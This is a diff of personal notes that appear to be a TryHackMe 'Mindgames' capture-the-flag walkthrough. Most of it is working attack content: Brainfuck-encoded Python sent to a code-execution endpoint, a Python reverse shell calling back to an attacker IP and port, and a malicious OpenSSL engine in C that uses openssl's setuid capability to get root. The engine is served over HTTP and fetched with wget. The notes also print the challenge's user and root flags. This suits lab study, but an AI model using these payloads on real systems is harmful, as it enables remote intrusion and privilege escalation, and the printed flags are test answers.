@@ -324,3 +324,330 @@ Connection: close
 Response:
 HTTP/1.1 200 OK
 
+Date: Wed, 12 Apr 2023 00:25:14 GMT
+
+Content-Length: 522
+
+Content-Type: text/plain; charset=utf-8
+
+Connection: close
+
+  File "<string>", line 1
+    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+ ^
+SyntaxError: invalid syntax
+
+Testing
+
+https://github.com/se162xg/notes/issues/6
+
+__import__("os").system("whoami")
+
++++++ ++++[ ->+++ +++++ +<]>+ +++++ +++++ +++.. <+++[ ->+++ <]>+. ++++.
++++.- .+++. ++.<+ +++[- >---- <]>-- ---.. <++++ +++[- >---- ---<] >----
+--.-- ----. <++++ ++++[ ->+++ +++++ <]>++ +++++ +++++ +.+++ +.<++ +++++
+++[-> ----- ----< ]>.++ +++++ .++++ +.<++ +++++ +[->+ +++++ ++<]> +++++
+.++++ ++.-- ----. +.<++ +[->- --<]> ----- -.+++ +++++ .<+++ +++++ [->--
+----- -<]>- ----. ----- -.<++ +++++ ++[-> +++++ ++++< ]>+++ +.<++ +[->-
+--<]> ----- -.+++ ++++. <+++[ ->--- <]>-- ---.< +++[- >+++< ]>+++ .----
+.<+++ +++++ [->-- ----- -<]>- ----- -.+++ ++++. <
+
+let's see
+
+Request:
+
+POST /api/bf HTTP/1.1
+
+Host: 10.10.109.15
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: text/plain
+
+Origin: http://10.10.109.15
+
+Content-Length: 560
+
+Connection: close
+
++++++ ++++[ ->+++ +++++ +<]>+ +++++ +++++ +++.. <+++[ ->+++ <]>+. ++++.
+
++++.- .+++. ++.<+ +++[- >---- <]>-- ---.. <++++ +++[- >---- ---<] >----
+
+--.-- ----. <++++ ++++[ ->+++ +++++ <]>++ +++++ +++++ +.+++ +.<++ +++++
+
+++[-> ----- ----< ]>.++ +++++ .++++ +.<++ +++++ +[->+ +++++ ++<]> +++++
+
+.++++ ++.-- ----. +.<++ +[->- --<]> ----- -.+++ +++++ .<+++ +++++ [->--
+
+----- -<]>- ----. ----- -.<++ +++++ ++[-> +++++ ++++< ]>+++ +.<++ +[->-
+
+--<]> ----- -.+++ ++++. <+++[ ->--- <]>-- ---.< +++[- >+++< ]>+++ .----
+
+.<+++ +++++ [->-- ----- -<]>- ----- -.+++ ++++. <
+
+Response:
+
+HTTP/1.1 200 OK
+
+Date: Wed, 12 Apr 2023 00:30:54 GMT
+
+Content-Length: 10
+
+Content-Type: text/plain; charset=utf-8
+
+Connection: close
+
+mindgames
+
+so final payload will be
+
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
+
+Request:
+
+POST /api/bf HTTP/1.1
+
+Host: 10.10.109.15
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: text/plain
+
+Origin: http://10.10.109.15
+
+Content-Length: 560
+
+Connection: close
+
++++++ +++++ [->++ +++++ +++<] >++++ +.+++ +.+++ .-.++ +.++. <++++ +++++
+
+[->-- ----- --<]> ---.< +++++ ++++[ ->+++ +++++ +<]>+ +.--- -.<++ +[->-
+
+--<]> ---.+ +++++ ++.-- ----. <+++[ ->+++ <]>++ ++++. <++++ ++++[ ->---
+
+----- <]>-- ----- -.<++ +++++ +[->+ +++++ ++<]> +++++ ++.++ .<+++ +[->-
+
+---<] >---. <+++[ ->+++ <]>++ +++.+ +.--- .<+++ [->-- -<]>- --.++ .<+++
+
+[->++ +<]>+ ++++. .<+++ +++++ [->-- ----- -<]>- ----- -.<++ +++++ +[->+
+
++++++ ++<]> +++.+ +++.< +++++ ++[-> ----- --<]> ----- --.<+ +++++ +[->+
+
++++++ +<]>+ +++++ +.<++ +++++ [->-- ----- <]>-- ---.< +++++ ++[-> +++++
+
+++<]> +++++ .---- .<+++ [->-- -<]>- --.++ +++++ +.--- ---.< +++[- >+++<
+
+]>+++ +++.< +++++ +++[- >---- ----< ]>--- ---.< +++++ +++[- >++++ ++++<
+
+]>+++ ++.-- --.<+ ++[-> ---<] >---. +++++ +++.- ----- .<+++ [->++ +<]>+
+
++++++ .<+++ +++++ [->-- ----- -<]>- ----- ----- -.<++ +++++ +[->+ +++++
+
+++<]> +++++ +++++ +.--- -.<++ +[->- --<]> ---.+ +++++ ++.-- ----. <+++[
+
+->+++ <]>++ ++++. <++++ ++++[ ->--- ----- <]>-- ----. <++++ [->++ ++<]>
+
++++.+ ++++. <++++ +[->+ ++++< ]>.<+ +++[- >---- <]>-- ----. +++++ .----
+
+----- .<+++ [->++ +<]>+ +++++ .<+++ +++[- >---- --<]> ----. <++++ ++++[
+
+->+++ +++++ <]>++ +++++ .---- .<+++ [->-- -<]>- --.++ +++++ +.--- ---.<
+
++++[- >+++< ]>+++ +++.< +++++ +++[- >---- ----< ]>--- ---.< +++++ +[->+
+
++++++ <]>+. ----. <+++[ ->--- <]>-- -.+++ +++++ .<+++ +[->+ +++<] >++++
+
+.<+++ [->-- -<]>- --.+. --.<+ ++[-> ---<] >---- .---- .<+++ [->++ +<]>+
+
+++.<+ +++++ [->-- ----< ]>.<+ +++[- >++++ <]>++ .<+++ ++++[ ->+++ ++++<
+
+]>+++ ++++. <++++ ++++[ ->--- ----- <]>-- ---.< +++++ ++[-> +++++ ++<]>
+
+++++. <+++[ ->+++ <]>++ +.-.. ----- ----. --.<+ +++[- >++++ <]>+. <++++
+
+++++[ ->--- ----- <]>-- ----- ----- ..--- ---.< +++[- >+++< ]>+++ +++.-
+
+.--.< +++[- >+++< ]>+.< +++[- >---< ]>-.+ ++.++ +++++ +.<++ +[->- --<]>
+
+--.++ +.-.+ ++.<+ +++[- >---- <]>-. <+++[ ->+++ <]>+. +++++ .++.. +++++
+
+.<+++ [->-- -<]>- ----- ..<++ ++[-> ++++< ]>++. <++++ +++[- >++++ +++<]
+
+>+++. ++++. <++++ ++++[ ->--- ----- <]>-- ---.< +++++ ++[-> +++++ ++<]>
+
++++++ .<+++ +[->+ +++<] >+.-- ---.< +++++ ++[-> ----- --<]> ----- -----
+
+---.< +++[- >---< ]>-.< +++++ +++[- >++++ ++++< ]>+++ +++++ +++.< +++++
+
++++[- >---- ----< ]>--- --.<+ +++++ +[->+ +++++ +<]>+ +++++ +.+++ .+++.
+
+----- --.++ +++++ ++.+. <++++ ++++[ ->--- ----- <]>-- ----- .+.++ +.+++
+
++.--- ----. <++++ [->++ ++<]> ++.<+ ++++[ ->--- --<]> --.<+ +++++ ++[->
+
++++++ +++<] >++++ +++++ +++++ +.+++ +.<++ +++++ +[->- ----- --<]> -----
+
+.<+++ ++++[ ->+++ ++++< ]>+++ ++.<+ +++[- >++++ <]>+. ----- .<+++ ++++[
+
+->--- ----< ]>--- ----- ----- .<+++ [->-- -<]>- .<+++ +++++ [->++ +++++
+
++<]>+ +++++ +++++ .<+++ +++++ [->-- ----- -<]>- ----. <++++ +++[- >++++
+
++++<] >++++ +++.+ ++.++ +.--- ----. +++++ ++++. +.<++ +++++ +[->- -----
+
+--<]> ----- --.+. +++.+ ++++. ----- ---.< ++++[ ->+++ +<]>+ +.<++ +++[-
+
+>---- -<]>- -.<++ +++++ +[->+ +++++ ++<]> +++++ +++++ +++++ .++++ .<+++
+
++++++ [->-- ----- -<]>- ----. <++++ +++[- >++++ +++<] >++++ +.<++ ++[->
+
+++++< ]>+.- ----. <++++ +++[- >---- ---<] >---- ----- ----. <+++[ ->---
+
+<]>-. <++++ ++++[ ->+++ +++++ <]>++ +++++ ++++. <++++ ++++[ ->--- -----
+
+<]>-- ---.< +++++ ++[-> +++++ ++<]> +++++ ++.++ +.+++ .---- ---.+ +++++
+
++++.+ .<+++ +++++ [->-- ----- -<]>- ----- -.+.+ ++.++ ++++. ----- ----.
+
+<++++ [->++ ++<]> ++.<+ +++++ +[->+ +++++ +<]>+ +++.< +++++ ++[-> -----
+
+--<]> --.<+ +++++ +[->+ +++++ +<]>+ ++++. ++.<+ +++[- >---- <]>-- -.<++
+
++[->+ ++<]> +++++ .++.- --.<+ ++[-> ---<] >---. ++.<+ ++[-> +++<] >++++
+
++..<+ +++++ ++[-> ----- ---<] >---- -.<++ +++++ [->++ +++++ <]>++ ++.--
+
+.<+++ [->++ +<]>+ +..<+ +++++ ++[-> ----- ---<] >---- .<+++ ++++[ ->+++
+
+++++< ]>++. <++++ +++[- >---- ---<] >---- ----. <+++[ ->+++ <]>++ ++.<+
+
++++++ +[->+ +++++ +<]>+ +.+++ ++++. +++++ .<+++ ++++[ ->--- ----< ]>---
+
+----- ----- -.<++ +++++ [->++ +++++ <]>++ .-.<+ +++[- >++++ <]>++ .<+++
+
+[->-- -<]>- -.<++ +++++ +[->- ----- --<]> ----- -.<++ +[->+ ++<]> +.<++
+
++[->- --<]> -.<++ +[->+ ++<]> ++.<+ +++++ +[->+ +++++ +<]>+ +++++ +++++
+
+.<+++ +++++ [->-- ----- -<]>- ----- -.<++ +++++ [->++ +++++ <]>++ +++++
+
++++.< +++++ ++[-> ----- --<]> ---.< ++++[ ->+++ +<]>+ +.<
+
+┌──(witty㉿kali)-[/tmp]
+└─$ rlwrap nc -lvnp 1338
+listening on [any] 1338 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.109.15] 51906
+bash: cannot set terminal process group (750): Inappropriate ioctl for device
+bash: no job control in this shell
+mindgames@mindgames:~/webserver$ whoami
+whoami
+mindgames
+mindgames@mindgames:~/webserver$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+<ver$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+mindgames@mindgames:~/webserver$ cd /home
+cd /home
+mindgames@mindgames:/home$ ls
+ls
+mindgames  tryhackme
+mindgames@mindgames:/home$ cd mindgames
+cd mindgames
+mindgames@mindgames:~$ ls
+ls
+user.txt  webserver
+mindgames@mindgames:~$ cat user.txt
+cat user.txt
+thm{411f7d38247ff441ce4e134b459b6268}
+
+mindgames@mindgames:~/webserver$ getcap -r / 2>/dev/null
+getcap -r / 2>/dev/null
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/openssl = cap_setuid+ep
+/home/mindgames/webserver/server = cap_net_bind_service+ep
+
+https://dozer.nz/posts/openssl-arginjection
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ nano engine.c   
+                                                              
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat engine.c
+
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <openssl/engine.h>
+
+static int bind(ENGINE *e, const char *id) 
+{
+ setuid(0);
+ setgid(0);
+ system("/bin/bash");
+ return 0;
+}
+
+IMPLEMENT_DYNAMIC_BIND_FN(bind)
+IMPLEMENT_DYNAMIC_CHECK_FN()
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sudo apt-get install libssl-dev
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ gcc -fPIC -o a.o -c engine.c && gcc -shared -o engine.so -lcrypto a.o
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.238.251 - - [12/Apr/2023 12:21:06] "GET /engine.so HTTP/1.1" 200 -
+
+mindgames@mindgames:~/webserver$ cd /tmp
+cd /tmp
+mindgames@mindgames:/tmp$ wget http://10.8.19.103:1234/engine.so
+wget http://10.8.19.103:1234/engine.so
+--  http://10.8.19.103:1234/engine.so
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 15712 (15K) [application/octet-stream]
+Saving to: ‘engine.so’
+
+engine.so           100%[===================>]  15.34K  45.0KB/s    in 0.3s    
+
+(45.0 KB/s) - ‘engine.so’ saved [15712/15712]
+
+mindgames@mindgames:/tmp$ chmod +x engine.so
+mindgames@mindgames:/tmp$ openssl req -engine ./engine.so
+openssl req -engine ./engine.so
+root@mindgames:/tmp# cd /root
+cd /root
+root@mindgames:/root# ls
+ls
+root.txt
+root@mindgames:/root# cat root.txt
+cat root.txt
+thm{1974a617cc84c5b51411c283544ee254}
+```
+- ![[Pasted image 20230411193020.png]]
+- ![[Pasted image 20230411193225.png]]
+- User flag.
+- user.txt
+- ***thm{411f7d38247ff441ce4e134b459b6268}***
+- Root flag.
+- /root/root.txt
+- ***thm{1974a617cc84c5b51411c283544ee254}***
+
+## Notes / Lessons Learned
+[[Empline]]
+
